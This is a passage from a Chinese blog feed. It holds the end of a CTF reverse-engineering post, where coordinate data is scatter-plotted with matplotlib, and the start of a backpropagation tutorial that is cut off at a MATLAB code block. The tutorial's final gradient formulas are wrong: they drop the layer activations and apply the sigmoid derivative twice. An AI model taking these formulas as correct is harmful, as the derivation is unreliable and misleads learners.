class="hljs-number">10</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">65.7</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">10</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">69.4</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">65.6</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">17</span>, <span class="hljs-number">11</span>, -<span class="hljs-number">69</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">68.6</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">66</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">65.7</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">65.2</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">12</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">66</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">10</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">11</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">68.8</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">67.4</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">65.5</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">67.3</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">13</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">65.5</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">66.6</span>),<br>(<span class="hljs-number">1</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">2</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">69.3</span>),<br>(<span class="hljs-number">3</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.8</span>),<br>(<span class="hljs-number">4</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">5</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">6</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">7</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.1</span>),<br>(<span class="hljs-number">8</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">9</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.5</span>),<br>(<span class="hljs-number">10</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">67.7</span>),<br>(<span class="hljs-number">11</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">65.9</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">67.1</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">14</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66.3</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.5</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.5</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">67.5</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">67.1</span>),<br>(<span class="hljs-number">0</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66.3</span>),<br>(<span class="hljs-number">1</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">2</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">3</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">4</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">5</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66.7</span>),<br>(<span class="hljs-number">6</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">7</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">8</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">9</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">67.4</span>),<br>(<span class="hljs-number">10</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">67.4</span>),<br>(<span class="hljs-number">11</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">67.2</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">66.1</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">65.8</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">15</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">14</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.7</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">66</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">67.6</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">65.1</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">66.6</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.2</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">67.9</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">66.8</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.1</span>),<br>(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">67.6</span>),<br>(<span class="hljs-number">1</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.4</span>),<br>(<span class="hljs-number">2</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.6</span>),<br>(<span class="hljs-number">3</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">4</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">5</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">67.4</span>),<br>(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.2</span>),<br>(<span class="hljs-number">7</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">8</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68</span>),<br>(<span class="hljs-number">9</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">10</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">11</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">65.1</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">68.4</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">69.5</span>),<br>(<span class="hljs-number">16</span>, <span class="hljs-number">16</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">15</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.8</span>),<br>(-<span class="hljs-number">14</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">67.5</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.7</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.4</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.5</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.7</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">65.7</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.1</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.5</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.9</span>),<br>(<span class="hljs-number">0</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.7</span>),<br>(<span class="hljs-number">1</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">2</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">67.9</span>),<br>(<span class="hljs-number">3</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.2</span>),<br>(<span class="hljs-number">4</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69</span>),<br>(<span class="hljs-number">5</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.7</span>),<br>(<span class="hljs-number">6</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.3</span>),<br>(<span class="hljs-number">7</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">8</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.2</span>),<br>(<span class="hljs-number">9</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.2</span>),<br>(<span class="hljs-number">10</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">11</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.4</span>),<br>(<span class="hljs-number">12</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">68.4</span>),<br>(<span class="hljs-number">13</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.8</span>),<br>(<span class="hljs-number">14</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">66.4</span>),<br>(<span class="hljs-number">15</span>, <span class="hljs-number">17</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">15</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">14</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">65.8</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">66.1</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">68.1</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">65.9</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">66.2</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">66.6</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">68</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">69.3</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">70</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">69.9</span>),<br>(<span class="hljs-number">0</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">67</span>),<br>(<span class="hljs-number">1</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">66.5</span>),<br>(<span class="hljs-number">2</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">3</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">66.8</span>),<br>(<span class="hljs-number">4</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">65.4</span>),<br>(<span class="hljs-number">5</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">6</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">69.9</span>),<br>(<span class="hljs-number">7</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">65.7</span>),<br>(<span class="hljs-number">8</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">66.9</span>),<br>(<span class="hljs-number">9</span>, <span class="hljs-number">18</span>, -<span class="hljs-number">67.3</span>),<br>(-<span class="hljs-number">15</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">14</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">65.2</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">67.8</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">66.9</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">66.1</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">66.3</span>),<br>(-<span class="hljs-number">8</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">65.3</span>),<br>(-<span class="hljs-number">7</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">65.6</span>),<br>(-<span class="hljs-number">6</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">5</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">69.1</span>),<br>(-<span class="hljs-number">4</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">69.4</span>),<br>(-<span class="hljs-number">3</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">68.4</span>),<br>(-<span class="hljs-number">2</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">69.9</span>),<br>(-<span class="hljs-number">1</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">68.6</span>),<br>(<span class="hljs-number">0</span>, <span class="hljs-number">19</span>, -<span class="hljs-number">67.1</span>),<br>(-<span class="hljs-number">14</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">68.3</span>),<br>(-<span class="hljs-number">13</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">12</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">67.7</span>),<br>(-<span class="hljs-number">11</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">67</span>),<br>(-<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">65.4</span>),<br>(-<span class="hljs-number">9</span>, <span class="hljs-number">20</span>, -<span class="hljs-number">67.6</span>)]<br></code></pre></td></tr></table></figure><p>matplotlib 尝试绘制 xy， 忽略z</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> matplotlib <span class="hljs-keyword">import</span> pyplot <span class="hljs-keyword">as</span> plt<br>x = []<br>y = []<br><span class="hljs-keyword">for</span> point <span class="hljs-keyword">in</span> data:<br>    x.append(point[<span class="hljs-number">0</span>])<br>    y.append(point[<span class="hljs-number">1</span>])<br><br>plt.scatter(x, y)<br>plt.show()<br></code></pre></td></tr></table></figure><img src="/2021/04/05/gslab2021-PC-Security/image-20210404022740104.png" class="" title="image-20210404022740104"><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://learnopengl-cn.github.io/01%20Getting%20started/08%20Coordinate%20Systems/">https://learnopengl-cn.github.io/01%20Getting%20started/08%20Coordinate%20Systems/</a></li><li><a href="https://learnopengl-cn.github.io/01%20Getting%20started/01%20OpenGL/">https://learnopengl-cn.github.io/01%20Getting%20started/01%20OpenGL/</a></li><li><a href="http://www.opengl-tutorial.org/cn/beginners-tutorials/tutorial-3-matrices/#%E6%A8%A1%E5%9E%8Bmodel%E8%A7%82%E5%AF%9Fview%E5%92%8C%E6%8A%95%E5%BD%B1projection%E7%9F%A9%E9%98%B5">http://www.opengl-tutorial.org/cn/beginners-tutorials/tutorial-3-matrices/#%E6%A8%A1%E5%9E%8Bmodel%E8%A7%82%E5%AF%9Fview%E5%92%8C%E6%8A%95%E5%BD%B1projection%E7%9F%A9%E9%98%B5</a></li><li><a href="https://www.jianshu.com/p/eedc41051bd9">https://www.jianshu.com/p/eedc41051bd9</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Reverse</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NN &amp; BP Algorithm</title>
    <link href="/2021/03/29/NN-BP-Algorithm/"/>
    <url>/2021/03/29/NN-BP-Algorithm/</url>
    
    <content type="html"><![CDATA[<h1 id="神经网络-amp-反向传播算法"><a href="#神经网络-amp-反向传播算法" class="headerlink" title="神经网络 &amp; 反向传播算法"></a>神经网络 &amp; 反向传播算法</h1><p>神经网络基本的表示方法网上有许多资料，我就不再赘述了。对我来说最难的部分是反向传播算法，我花了许多时间去理解反向传播算法。</p><h2 id="链式求导"><a href="#链式求导" class="headerlink" title="链式求导"></a>链式求导</h2><p>反向传播算法就是复合函数链式求导的一个应用，什么是链式求导呢？</p><p>以求 $ e=(a+b)*(b+1) $ 的偏导数为例子</p><img src="/2021/03/29/NN-BP-Algorithm/ee59254c9432b47cfcc3b11eab3e5984_1440w.jpg" class="" title="img"><p>根据链式法制,  </p><p>$\frac{\delta e}{\delta a} = \frac{\delta e}{\delta c} \frac{\delta c}{\delta a}$</p><p>$\frac{\delta e}{\delta b} = \frac{\delta e}{\delta c} \frac{\delta c}{\delta b} + \frac{\delta e}{\delta d} \frac{\delta d}{\delta b}$</p><p>不难发现， $\frac{\delta e}{\delta a}$ 和 $\frac{\delta e}{\delta b}$ 的计算路径有重复项，反向传播算法避免了重复计算，有点类似动态规划的思想。反向传播算法反向逐层计算偏导数，实现只通过一次计算，得出代价函数对所有参数的梯度。</p><h2 id="反向传播算法过程"><a href="#反向传播算法过程" class="headerlink" title="反向传播算法过程"></a>反向传播算法过程</h2><p> 编程作业4给的神经网络模型如下</p><img src="/2021/03/29/NN-BP-Algorithm/image-20210329171546567.png" class="" title="image-20210329171546567"><p>如何利用反向传播算法求 $\theta^{(1)}$ 和 $\theta^{(2)}$ 呢？</p><p>首先假设代价函数的符号为 E，并且有如下表达式</p><img src="/2021/03/29/NN-BP-Algorithm/image-20210329171956835.png" class="" title="image-20210329171956835"><p>下面内容就是我自己根据链式求导法则推的，因为很多文章直接引入一个叫“误差项”的概念，非常难理解。</p><p>根据链式求导法则，可以得出:</p><p>$\frac{\delta E}{\delta \theta^{(2)}} = \frac{\delta E}{\delta a^{(3)}} \frac{\delta a^{(3)}}{\delta z^{(3)}} \frac{\delta z^{(3)}}{\delta \theta^{(2)}}$</p><p>$\frac{\delta E}{\delta \theta^{(1)}} = \frac{\delta E}{\delta a^{(3)}} \frac{\delta a^{(3)}}{\delta z^{(3)}} \frac{\delta z^{(3)}}{\delta a^{(2)}} \frac{\delta a^{(2)}}{\delta z^{(2)}} \frac{\delta a^{(2)}}{\delta \theta^{(1)}}$</p><p>令</p><p>$\delta^{(3)} = \frac{\delta E}{\delta a^{(3)}}\frac{\delta a^{(3)}}{\delta z^{(3)}} = a^{(3)} - y$</p><p>$\delta^{(2)} = \frac{\delta E}{\delta a^{(3)}} \frac{\delta a^{(3)}}{\delta z^{(3)}} \frac{\delta z^{(3)}}{\delta a^{(2)}} \frac{\delta a^{(2)}}{\delta z^{(2)}} = (\theta^{(2)})^T\delta^{(3)}g’(z^{(2)})$</p><p>代入偏导数公式合并</p><p>$\frac{\delta E}{\delta \theta^{(2)}} = \delta^{(3)}g’(z^{3})$</p><p>$\frac{\delta E}{\delta \theta^{(1)}} = \delta^{(2)}g’(z^{2})$</p><p>用上面这两个公式就可以算梯度了，每一轮迭代算出所有训练集的梯度和，最后用平均梯度来代替当前次迭代的梯度。</p><p> $\delta^{(3)}$ 的求导可以看参考文献[4]，交叉商的求导。看起来很像平方误差的导数….其实并不是。</p><h2 id="lab4-代码"><a href="#lab4-代码" class="headerlink" title="lab4 代码"></a>lab4 代码</h2><p>向量化实现 nnCostFunction 代码如下</p><figure class="highlight matlab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span 